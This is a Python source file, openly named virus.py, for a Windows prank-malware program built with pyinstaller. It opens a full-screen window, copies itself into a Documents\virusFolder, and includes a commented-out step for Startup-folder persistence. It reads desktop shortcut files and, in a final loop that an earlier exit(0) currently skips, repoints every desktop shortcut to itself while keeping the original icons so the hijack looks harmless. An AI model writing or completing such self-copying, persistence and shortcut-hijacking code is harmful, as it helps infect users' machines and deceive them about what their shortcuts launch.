# To compile to a standalone executable file, run the following command in the terminal:
# pyinstaller --onefile C:\py3\Viruses\virus.py

# Then delete the extra folders because those were only used for the creation of the executable


from win32com.client import Dispatch
import os, winshell
import re
import time
from sys import argv
import sys
import shutil
import subprocess

from tkinter import *
import ctypes

root = Tk()
user32 = ctypes.WinDLL("user32")
screen = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
root.geometry(str(screen[0]) + "x" + str(screen[1]))
root.update()  #know that it does something

script = argv
runningFilePath = str(script[0])
runningFileDirectory = os.path.dirname(os.path.abspath(sys.argv[0]))


desktopPath = winshell.desktop()
documentsPath = desktopPath.split("Desktop")[0] + "Documents"

viruspath = documentsPath + "\\virusFolder\\virus.exe"
virusdirectory = documentsPath + "\\virusFolder"

if runningFileDirectory == virusdirectory:
    os.system('"C:\py3\hunger games.py"')
    exit(1)

documentsPathDirs = [x[0] for x in os.walk(documentsPath)]
for i, file in enumerate(documentsPathDirs):
    documentsPathDirs[i] = file.split(documentsPath)[-1]
if not "\\virusFolder" in documentsPathDirs:
    os.mkdir(virusdirectory)
    shutil.copy(runningFilePath, virusdirectory)
# Below copies the program to the Windows Startup directory, where it will run on computer startup
#shutil.copy(runningFilePath, "C:\Users\codeC\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
time.sleep(3)

desktopFiles = os.listdir(desktopPath)
shortcuts = []
for file in desktopFiles:
    print(file)
    if len(file.split(".")) >= 2 and file.split(".")[-1] == 'lnk':
        shortcuts.append(os.path.join(desktopPath, file))
print(shortcuts)
lnkPaths = []
workingShortcuts = []
for i, file in enumerate(shortcuts):
    lnkFile = open(file, 'r', encoding="ISO-8859-1")
    filelnkPaths = re.findall("C:.*?exe", lnkFile.read(), flags=re.DOTALL)
    if len(filelnkPaths) == 0:
        continue
    lnkPath = filelnkPaths[-1]
    if chr(0) in lnkPath:
        print("Error in link path")
        del shortcuts[i]
        i-= 1
        continue
    if "Windows" in lnkPath:
        lnkPath = lnkPath.split("Windows")[-1][1:]
    lnkPaths.append(lnkPath)
    workingShortcuts.append(file)
print(workingShortcuts)
print(lnkPaths)
print(len(workingShortcuts), len(lnkPaths))

# The following loop replaces all the shortcuts on the Desktop with links to this file
exit(0)
for i, path in enumerate(workingShortcuts):
    shell = Dispatch('Wscript.shell')
    shortcut = shell.CreateShortcut(path)
    shortcut.TargetPath = viruspath
    shortcut.WorkingDirectory = virusdirectory
    shortcut.IconLocation = lnkPaths[i]
    shortcut.save()